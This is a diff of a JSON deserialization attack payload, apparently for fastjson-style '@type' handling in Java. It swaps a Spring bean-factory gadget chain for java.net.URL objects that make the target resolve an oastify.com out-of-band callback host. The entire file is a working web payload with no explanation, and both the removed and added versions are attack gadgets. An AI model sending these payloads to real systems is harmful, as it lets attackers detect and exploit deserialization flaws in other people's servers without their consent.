@@ -1,31 +1,17 @@
 {
-  "@type": "java.util.Arrays$ArrayList",
+  "@type": "java.util.HashMap",
+  "@keys": [
+    {
+      "@type": "java.net.URL",
+      "protocol": "dns",
+      "host": "e8n0ad9g71jz34icekulunoga7gx4m.oastify.com"
+    }
+  ],
   "@items": [
     {
-      "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
-      "pointcut": {
-        "@type": "org.springframework.aop.TruePointcut"
-      },
-      "adviceBeanName": "caller",
-      "beanFactory": {
-        "@type": "org.springframework.beans.factory.support.DefaultListableBeanFactory",
-        "beanDefinitionMap": {
-          "caller": {
-            "@type": "org.springframework.beans.factory.support.RootBeanDefinition",
-            "factoryBeanName": "obj",
-            "factoryMethodName": "start",
-            "propertyValues": {
-              "propertyValueList": []
-            }
-          }
-        },
-        "singletonObjects": {
-          "obj": {
-            "@type": "java.net.InetAddress",
-            "hostName": "google.com"
-          }
-        }
-      }
+      "@type": "java.net.URL",
+      "protocol": "dns",
+      "host": "e8n0ad9g71jz34icekulunoga7gx4m.oastify.com"
     }
   ]
 }
